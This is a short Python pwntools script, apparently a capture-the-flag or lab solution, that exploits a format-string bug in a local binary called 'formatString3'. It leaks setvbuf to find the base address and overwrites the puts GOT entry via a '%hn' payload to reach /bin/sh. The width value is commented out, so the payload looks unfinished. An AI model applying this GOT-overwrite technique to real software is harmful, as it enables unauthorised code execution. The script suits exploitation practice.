import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./formatString3')
io = elf.process()
pwn.gdb.attach(io)
time.sleep(3)
#The goal is to call /bin/sh
#Set the base address using setvbufGiven - setvbufOffset
#Get address of the normal_string 
#Replace puts GOT entry with the address of normal_string

#This section sets the base address
io.recvuntil(": ")
setVBufAddr = io.recv(14)
setVBufAddr = int(setVBufAddr,16)
elf.address = setVBufAddr - elf.plt['setvbuf']
print(setVBufAddr)
print(elf.plt['setvbuf'])

#This section replaces the GOT entry of puts with the address of normal_string

normalAddr = elf.sym['normal_string']
normalAddr = hex(normalAddr)
print(normalAddr)
putsGOT =hex(elf.got['puts'])
lowerBytes = normalAddr[10:14]
lowerBytes = int(lowerBytes,16)
print(lowerBytes)
padding = 5
if(lowerBytes > 9999):
    padding = 4
#The only bytes that have to change are the lowest 4, so addr + 4
#putsGOTAddr+4%NumBytesx%6$hn
payload = b""
payload += b'%'
#payload += (str(lowerBytes)).encode()
payload += b'x%8$hn'
payload += b'B'*padding
payload += pwn.p64(int(putsGOT,16)+4)
io.sendline(payload)
io.interactive()
print(payload)

